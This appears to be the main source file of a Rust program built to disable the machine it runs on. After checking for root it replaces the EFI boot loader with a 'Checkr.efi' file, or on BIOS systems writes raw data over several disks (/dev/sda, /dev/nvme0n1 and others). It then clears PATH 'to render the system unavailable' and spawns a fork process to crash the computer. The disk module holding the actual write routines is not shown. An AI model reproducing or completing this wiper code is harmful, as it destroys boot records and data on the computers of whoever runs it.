use std::process;
use nix::unistd::Uid;
use std::path;
use std::env;
use std::os::unix::process::CommandExt;

mod log;
mod disk;

fn main() {
    env::set_var("VERBOSE", "1");
    log::verbose("Starting up");

    let uid:bool = Uid::effective().is_root();
    if !uid {
        log::error("Program is not running as root, please run as root");
        process::exit(42);
    }
    //*Checks if system is booted in uefi. if it is it copies the Checkr.efi file over to EFI/boot/bootx64.efi. if not it writes raw data to the disk
    if path::Path::new("/sys/firmware/efi").exists() {
      log::info("uefi detected");
       let copytouefi = disk::copytoefi(); 
       if copytouefi.is_err() { log::warn("failed to copy file to EFI partition");}
    }
    else{
        if env::var("VERBOSE").is_ok() {log::info("bios detected");}
        let writetodisk = disk::writetodisk("/dev/sda".to_string());
        if writetodisk.is_err() { log::warn("failed to write to disk");}
        let writetodisk = disk::writetodisk("/dev/hda".to_string());
        if writetodisk.is_err() { log::warn("failed to write to disk");}
        let writetodisk = disk::writetodisk("/dev/nvme0n1".to_string());
        if writetodisk.is_err() { log::warn("failed to write to disk");}
        let writetodisk = disk::writetodisk("/dev/vda".to_string());
        if writetodisk.is_err() { log::warn("failed to write to disk");}

    //*Set path var to an empty string to render the system unavailable.
    env::set_var("PATH", "");

    //*Finally it crashes the computer.
    let _fork = process::Command::new("/usr/bin/fork").spawn();
    
    process::exit(0);
    }
}